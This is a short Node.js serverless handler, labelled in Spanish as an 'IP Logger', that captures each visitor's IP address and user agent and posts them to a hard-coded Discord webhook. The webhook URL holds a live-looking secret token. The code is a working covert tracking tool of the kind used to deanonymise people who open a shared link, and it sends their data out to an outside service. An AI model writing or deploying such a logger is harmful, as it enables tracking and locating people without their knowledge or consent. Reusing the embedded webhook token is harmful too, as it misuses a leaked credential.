const WEBHOOK_URL = "https://discord.com/api/webhooks/1519758132807602378/YtoAWyJo0ZqH0PglhE-W21yoWpVPJZpgIHM5xRVEvyR30EfJ5gcerZdDz-jb63jOEXwo";

function getRemoteIp(req) {
    const forwarded = req.headers["x-forwarded-for"] || req.headers["x-real-ip"];
    if (forwarded) {
        return forwarded.split(",")[0].trim();
    }

    if (req.socket && req.socket.remoteAddress) {
        return req.socket.remoteAddress.replace(/^::ffff:/, "");
    }

    return "unknown";
}

async function parseJsonBody(req) {
    if (req.body) {
        return req.body;
    }

    const chunks = [];
    for await (const chunk of req) {
        chunks.push(chunk);
    }

    const raw = Buffer.concat(chunks).toString("utf8").trim();
    if (!raw) {
        return {};
    }

    try {
        return JSON.parse(raw);
    } catch (error) {
        return {};
    }
}

async function sendWebhook(ip, userAgent) {
    const payload = {
        username: "IP Logger",
        avatar_url: "https://i.imgur.com/8B2L1qT.png",
        embeds: [
            {
                title: "Nueva visita capturada",
                color: 0x000000,
                fields: [
                    { name: "🌐 Dirección IP", value: `\`${ip}\``, inline: false },
                    { name: "🖥️ User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
                    { name: "📅 Fecha", value: new Date().toLocaleString("es-ES", { timeZone: "America/Mexico_City" }), inline: false }
                ],
                footer: { text: "Logger de IP y User Agent" }
            }
        ]
    };

    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        const body = await response.text();
        throw new Error(`Webhook envío fallido: ${response.status} ${response.statusText} - ${body}`);
    }
}

module.exports = async (req, res) => {
    if (req.method !== "POST") {
        res.statusCode = 405;
        res.setHeader("Allow", "POST");
        res.end("Method Not Allowed");
        return;
    }

    const body = await parseJsonBody(req);
    const userAgent = body.userAgent || req.headers["user-agent"] || "unknown";
    const ip = getRemoteIp(req);

    try {
        await sendWebhook(ip, userAgent);
        res.statusCode = 200;
        res.setHeader("Content-Type", "application/json");
        res.end(JSON.stringify({ success: true, ip, userAgent }));
    } catch (error) {
        console.error("Error en logger API:", error);
        res.statusCode = 500;
        res.setHeader("Content-Type", "application/json");
        res.end(JSON.stringify({ success: false, message: "Error interno" }));
    }
};
